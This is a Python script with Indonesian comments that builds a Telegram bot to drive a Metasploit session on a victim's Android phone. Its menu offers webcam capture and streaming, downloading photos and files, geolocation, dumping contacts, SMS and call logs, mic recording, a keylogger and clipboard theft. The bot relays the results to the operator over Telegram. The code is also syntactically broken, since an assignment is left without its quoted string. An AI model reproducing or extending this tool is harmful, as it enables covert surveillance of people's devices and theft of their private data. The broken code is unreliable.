import zipfile
import os

# Buat struktur folder
os.makedirs("/mnt/data/metatele", exist_ok=True)
base_path = "/mnt/data/metatele"

# Isi dari bot.py
bot_py =
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import os
import time

BOT_TOKEN = 'ISI_TOKEN_BOT_KAMU'
OWNER_ID = 123456789  # Ganti dengan ID kamu

bot = telebot.TeleBot(BOT_TOKEN)

def kirim_menu(chat_id):
    markup = InlineKeyboardMarkup()
    markup.row_width = 2
    markup.add(
        InlineKeyboardButton("📷 Kamera", callback_data="webcam_snap"),
        InlineKeyboardButton("📁 File", callback_data="download /sdcard/Download/"),
        InlineKeyboardButton("📍 Lokasi", callback_data="geolocate"),
        InlineKeyboardButton("📞 Kontak", callback_data="dump_contacts"),
        InlineKeyboardButton("🖼️ Screenshot", callback_data="screenshot"),
        InlineKeyboardButton("🎙️ Rekam Mic", callback_data="record_mic"),
        InlineKeyboardButton("🎥 Kamera Live", callback_data="webcam_stream"),
        InlineKeyboardButton("🗂️ Unduh DCIM", callback_data="download /sdcard/DCIM/"),
        InlineKeyboardButton("📞 Call Logs", callback_data="dump_calllog"),
        InlineKeyboardButton("✉️ SMS Logs", callback_data="dump_sms"),
        InlineKeyboardButton("⌨️ Keylogger On", callback_data="keyscan_start"),
        InlineKeyboardButton("🛑 Keylogger Off", callback_data="keyscan_stop"),
        InlineKeyboardButton("📋 Clipboard", callback_data="clipboard")
    )
    bot.send_message(chat_id, "📲 Pilih fitur Metasploit:", reply_markup=markup)


@bot.message_handler(commands=['menu'])
def show_menu(message):
    if message.chat.id != OWNER_ID:
        return
    kirim_menu(message.chat.id)

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.message.chat.id != OWNER_ID:
        return
    cmd = call.data
    with open("control.txt", "w") as f:
        f.write(cmd)
    bot.answer_callback_query(call.id, f"✅ Perintah: {cmd}")
    bot.send_message(call.message.chat.id, f"⏳ Menjalankan `{cmd}`...", parse_mode="Markdown")

def kirim_hasil():
    while True:
        if os.path.exists("result.txt"):
            with open("result.txt", "r") as f:
                hasil = f.read()
            bot.send_message(OWNER_ID, f"📤 Hasil:\n\n`{hasil}`", parse_mode="Markdown")
            os.remove("result.txt")
        time.sleep(5)

import threading
threading.Thread(target=kirim_hasil).start()

bot.polling()
